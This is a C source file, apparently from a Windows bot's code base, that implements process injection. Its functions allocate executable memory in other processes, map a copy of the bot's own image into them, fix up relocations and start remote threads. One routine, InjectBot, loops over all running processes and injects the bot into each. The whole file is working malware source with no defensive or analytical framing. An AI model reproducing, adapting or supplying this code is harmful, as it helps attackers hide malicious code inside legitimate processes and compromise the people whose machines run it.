#include "../common/bot_structs.h"

#include "../common/mem.h"
#include "../common/string.h"
#include "../common/utils.h"
#include "inject.h"

extern bot_t bot;


LPVOID WINAPI InjectData(HANDLE hProcess, LPVOID pData, DWORD dwSize)
{
	LPVOID lpAddress;

	if ((lpAddress = bot.api.pVirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) == NULL)
		return NULL;
	
	if (!bot.api.pWriteProcessMemory(hProcess, lpAddress, pData, dwSize, NULL))
	{
		bot.api.pVirtualFreeEx(hProcess, lpAddress, dwSize, MEM_RELEASE);
		return NULL;
	}

	return lpAddress;
}

BOOL InjectBotEx(DWORD dwProcessID, LPTHREAD_START_ROUTINE start)
{
	DWORD dwAddr = 0;
	HANDLE hRemoteThread, hProcess;
	BOOL bInjected = FALSE;

	if ((hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION |
		PROCESS_VM_WRITE |
		PROCESS_VM_READ |
		PROCESS_CREATE_THREAD |
		PROCESS_DUP_HANDLE, FALSE, dwProcessID)) == 0)
		return FALSE;

	if ((dwAddr = InjectCodeEx(hProcess, start)) == 0)
		return FALSE;

	if ((hRemoteThread = bot.api.pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)dwAddr, NULL, 0, NULL)) != 0)
	{
		bot.api.pCloseHandle(hRemoteThread);
		bInjected = TRUE;
	}

	bot.api.pCloseHandle(hProcess);

	return bInjected;
}


LPVOID WINAPI GetImageBase(LPVOID procAddr)
{
	LPBYTE addr = (LPBYTE)procAddr;
	addr = (LPBYTE)((size_t)addr & 0xFFFFFFFFFFFF0000);
	for (;;)
	{
		PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)addr;
		if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE)
		{
			if (dosHeader->e_lfanew < 0x1000)
			{
				PIMAGE_NT_HEADERS header = (PIMAGE_NT_HEADERS)&((unsigned char*)addr)[dosHeader->e_lfanew];
				if (header->Signature == IMAGE_NT_SIGNATURE)
					break;
			}
		}
		addr -= 0x1000;
	}
	return addr;
}

void ProcessRelocs(PIMAGE_BASE_RELOCATION Relocs, DWORD ImageBase, DWORD Delta, DWORD RelocSize)
{
	ULONG r;
	PIMAGE_FIXUP_ENTRY Fixup;
	DWORD dwPointerRva;
	PIMAGE_BASE_RELOCATION Reloc = Relocs;

	while ((DWORD)Reloc - (DWORD)Relocs < RelocSize)
	{
		if (!Reloc->SizeOfBlock)
		{
			break;
		}

		Fixup = (PIMAGE_FIXUP_ENTRY)((ULONG)Reloc + sizeof(IMAGE_BASE_RELOCATION));

		for (r = 0; r < (Reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) >> 1; r++)
		{
			dwPointerRva = Reloc->VirtualAddress + Fixup->Offset;

			if (Fixup->Type == IMAGE_REL_BASED_HIGHLOW)
			{
				*(PULONG)((ULONG)ImageBase + dwPointerRva) += Delta;
			}

			Fixup++;
		}

		Reloc = (PIMAGE_BASE_RELOCATION)((ULONG)Reloc + Reloc->SizeOfBlock);
	}

	return;
}

DWORD InjectCode(DWORD dwProcessID, LPVOID lpFunction)
{
	HANDLE hProcess;
	DWORD dwAddr;

	do
	{
		hProcess = 0;

		if ((hProcess = OpenProcess(PROCESS_QUERY_INFORMATION |
			PROCESS_VM_OPERATION |
			PROCESS_VM_WRITE |
			PROCESS_VM_READ |
			PROCESS_CREATE_THREAD |
			PROCESS_DUP_HANDLE, FALSE, dwProcessID)) == 0)
			break;

		dwAddr = InjectCodeEx(hProcess, lpFunction);

	} while (FALSE);

	if (hProcess != 0)
		bot.api.pCloseHandle(hProcess);

	return dwAddr;
}

DWORD InjectCodeEx(HANDLE hProcess, LPVOID lpFunction)
{
	HANDLE hMap, hRemoteThread, hMutex, hRemoteMutex;
	DWORD dwBase, dwSize, dwViewSize, dwNewBaseAddr, dwAddr, dwProcessID;
	LPVOID lpView;
	NTSTATUS Status;
	PIMAGE_DOS_HEADER dHeader;
	PIMAGE_NT_HEADERS ntHeaders;
	ULONG RelRVA, RelSize;

	do
	{
		hMap = 0;
		hRemoteThread = 0;
		lpView = NULL;
		hMutex = 0;
		hRemoteMutex = 0;

		if ((dwProcessID = GetProcessIdByHandle(hProcess)) == -1)
			break;

		if ((hMutex = CreateMutexOfProcess(dwProcessID)) == 0)
			break;

		if (!bot.api.pDuplicateHandle(bot.api.pGetCurrentProcess(), hMutex, hProcess, &hRemoteMutex, 0, FALSE, DUPLICATE_SAME_ACCESS))
			break;

		dwBase = (DWORD)GetImageBase(lpFunction);
		dwSize = ((PIMAGE_OPTIONAL_HEADER)((LPVOID)((BYTE *)(dwBase)+((PIMAGE_DOS_HEADER)(dwBase))->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER))))->SizeOfImage;

		if ((hMap = bot.api.pCreateFileMappingW(CWA(GetCurrentProcess)(), NULL, PAGE_EXECUTE_READWRITE, 0, dwSize, NULL)) == 0)
			break;

		if ((lpView = bot.api.pMapViewOfFile(hMap, FILE_MAP_WRITE, 0, 0, 0)) == NULL)
			break;

		memcopy(lpView, (LPVOID)dwBase, dwSize);

		dwViewSize = 0;
		dwNewBaseAddr = 0;

		if ((Status = (NTSTATUS)bot.api.pNtMapViewOfSection(hMap, hProcess, (PVOID*)&dwNewBaseAddr, 0, dwSize, NULL, &dwViewSize, (SECTION_INHERIT)1, 0, PAGE_EXECUTE_READWRITE)) != STATUS_SUCCESS)
			break;

		dHeader = (PIMAGE_DOS_HEADER)dwBase;
		ntHeaders = ntHeaders = (PIMAGE_NT_HEADERS)RVATOVA(dwBase, dHeader->e_lfanew);

		RelRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
		RelSize = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

		ProcessRelocs((PIMAGE_BASE_RELOCATION)(dwBase + RelRVA), (DWORD)lpView, dwNewBaseAddr - dwBase, RelSize);

		dwAddr = (DWORD)lpFunction - dwBase + dwNewBaseAddr;

	} while (FALSE);

	if (hMutex != 0)
		bot.api.pCloseHandle(hMutex);

	if (hMap != 0)
		bot.api.pCloseHandle(hMap);

	if (hRemoteThread != 0)
		bot.api.pCloseHandle(hRemoteThread);

	if (lpView != NULL)
		bot.api.pUnmapViewOfFile(lpView);

	return dwAddr;
}

DWORD InjectBot(LPTHREAD_START_ROUTINE start)
{
	HANDLE hSnapshot;
	PROCESSENTRY32W pe32;
	DWORD dwInjected = 0;

	if ((hSnapshot = bot.api.pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
		return -1;

	memzero(&pe32, sizeof(PROCESSENTRY32W));
	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (bot.api.pProcess32FirstW(hSnapshot, &pe32))
	{
		do 
		{
			if (pe32.th32ProcessID == bot.api.pGetCurrentProcessId()) continue;

			if (InjectBotEx(pe32.th32ProcessID, start))
				dwInjected++;
		} 
		while (bot.api.pProcess32NextW(hSnapshot, &pe32));
	}

	bot.api.pCloseHandle(hSnapshot);

	return dwInjected;
}

LPVOID CopyModule(HANDLE proc, LPVOID image)
{
	PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)((LPBYTE)image + ((PIMAGE_DOS_HEADER)image)->e_lfanew);
	PIMAGE_DATA_DIRECTORY datadir;
	DWORD size = headers->OptionalHeader.SizeOfImage;
	LPVOID mem = NULL;
	LPBYTE buf = NULL;
	BOOL ok = FALSE;

	if (headers->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	mem = bot.api.pVirtualAllocEx(proc, NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (mem != NULL) {
		buf = (LPBYTE)bot.api.pVirtualAlloc(NULL, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

		if (buf != NULL) {
			memcopy(buf, image, size);

			datadir = &headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

			if (datadir->Size > 0 && datadir->VirtualAddress > 0) {
				DWORD_PTR delta = (DWORD_PTR)((LPBYTE)mem - headers->OptionalHeader.ImageBase);
				DWORD_PTR olddelta = (DWORD_PTR)((LPBYTE)image - headers->OptionalHeader.ImageBase);
				PIMAGE_BASE_RELOCATION reloc = (PIMAGE_BASE_RELOCATION)(buf + datadir->VirtualAddress);

				while (reloc->VirtualAddress != 0) {
					if (reloc->SizeOfBlock >= sizeof(IMAGE_BASE_RELOCATION)) {
						DWORD count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
						LPWORD list = (LPWORD)((LPBYTE)reloc + sizeof(IMAGE_BASE_RELOCATION));
						DWORD i;

						for (i = 0; i < count; i++) {
							if (list[i] > 0) {
								DWORD_PTR *p = (DWORD_PTR *)(buf + (reloc->VirtualAddress + (0x0FFF & (list[i]))));

								*p -= olddelta;
								*p += delta;
							}
						}
					}

					reloc = (PIMAGE_BASE_RELOCATION)((LPBYTE)reloc + reloc->SizeOfBlock);
				}

				ok = bot.api.pWriteProcessMemory(proc, mem, buf, size, NULL);
			}

			bot.api.pVirtualFree(buf, 0, MEM_RELEASE); // release buf
		}

		if (!ok) {
			bot.api.pVirtualFreeEx(proc, mem, 0, MEM_RELEASE);
			mem = NULL;
		}
	}

	return mem;
}